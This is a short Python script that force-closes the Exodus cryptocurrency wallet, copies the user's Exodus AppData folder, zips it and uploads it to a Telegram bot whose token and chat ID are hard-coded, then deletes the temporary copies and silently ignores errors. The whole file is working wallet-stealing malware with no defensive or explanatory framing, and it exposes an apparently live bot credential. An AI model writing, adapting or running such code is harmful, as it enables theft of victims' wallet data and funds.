import os
import shutil
import tempfile
import requests
import subprocess
from pathlib import Path
import signal
import psutil

# === CONFIG ===
BOT_TOKEN = "8201470632:AAF5IUsKsaw6P0sXCzKzjFxkA58HRhUi0ok"
CHAT_ID = "-1003124606143"
SOURCE_FOLDER = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "Exodus")
# =================

def force_close_exodus():
    """Forcefully terminate all running Exodus processes."""
    for proc in psutil.process_iter(['name']):
        if proc.info['name'] and "Exodus" in proc.info['name']:
            try:
                proc.kill()
            except Exception:
                pass  # silently ignore

def copy_to_temp(src_folder: str) -> Path:
    """Copy the source folder to a temporary location, skipping locked files."""
    tmp_parent = Path(tempfile.mkdtemp(prefix="Exodus_copy_"))
    tmp_dst = tmp_parent / "Exodus"

    shutil.copytree(
        src_folder,
        tmp_dst,
        dirs_exist_ok=True,
        copy_function=shutil.copy2,
        ignore_errors=lambda func, path, excinfo: True
    )
    return tmp_dst

def make_zip(folder_path: Path) -> Path:
    """Create a zip archive from folder_path."""
    zip_base = folder_path.parent / (folder_path.name + "_backup")
    zip_path = shutil.make_archive(base_name=str(zip_base), format='zip', root_dir=str(folder_path), base_dir='.')
    return Path(zip_path)

def send_file_telegram(bot_token: str, chat_id: str, file_path: Path):
    """Send a file to Telegram."""
    url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
    with open(file_path, "rb") as f:
        files = {"document": (file_path.name, f)}
        data = {"chat_id": chat_id}
        requests.post(url, data=data, files=files, timeout=120)

def cleanup_paths(*paths):
    for p in paths:
        try:
            if not p:
                continue
            if isinstance(p, (str, Path)):
                p = Path(p)
            if p.exists():
                if p.is_file():
                    p.unlink()
                else:
                    shutil.rmtree(p)
        except Exception:
            pass  # silently ignore

def main():
    force_close_exodus()  # force close Exodus

    tmp_folder = None
    zip_path = None

    try:
        tmp_folder = copy_to_temp(SOURCE_FOLDER)
        zip_path = make_zip(tmp_folder)
        send_file_telegram(BOT_TOKEN, CHAT_ID, zip_path)
    finally:
        cleanup_paths(zip_path, tmp_folder.parent if tmp_folder else None)

if __name__ == "__main__":
    main()
